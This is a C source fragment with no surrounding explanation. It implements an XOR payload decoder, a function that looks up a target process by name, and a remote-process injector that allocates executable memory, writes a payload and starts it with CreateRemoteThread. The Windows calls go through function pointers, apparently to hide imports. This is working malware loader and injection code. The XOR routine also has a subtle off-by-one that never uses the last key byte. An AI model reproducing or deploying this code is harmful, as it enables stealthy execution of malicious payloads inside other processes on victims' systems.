void XOR(char *data, size_t data_len, char *key, size_t key_len) {
  int j = 0;

  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1)
      j = 0;

    data[i] = data[i] ^ key[j];
    j++;
  }
}

int findTarget(pCreateToolhelp32Snapshot fSnap, pProcess32First fFirst,
               pProcess32Next fNext, const char *procname) {
  HANDLE hSnap;
  PROCESSENTRY32 pe32;
  int pid = 0;

  hSnap = fSnap(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return 0;

  pe32.dwSize = sizeof(PROCESSENTRY32);
  if (!fFirst(hSnap, &pe32)) {
    CloseHandle(hSnap);
    return 0;
  }

  do {
    if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
      pid = pe32.th32ProcessID;
      break;
    }
  } while (fNext(hSnap, &pe32));

  CloseHandle(hSnap);
  return pid;
}

int inject(pVirtualAllocEx fAlloc, pWriteProcessMemory fWrite,
           pCreateRemoteThread fThread, HANDLE hProc, unsigned char *pl,
           unsigned int pl_len) {
  LPVOID pRemote = fAlloc(hProc, NULL, pl_len, MEM_COMMIT, PAGE_EXECUTE_READ);
  if (!pRemote)
    return -1;

  fWrite(hProc, pRemote, (PVOID)pl, (SIZE_T)pl_len, NULL);

  HANDLE hThread =
      fThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
  if (hThread) {
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    return 0;
  }
  return -1;
}

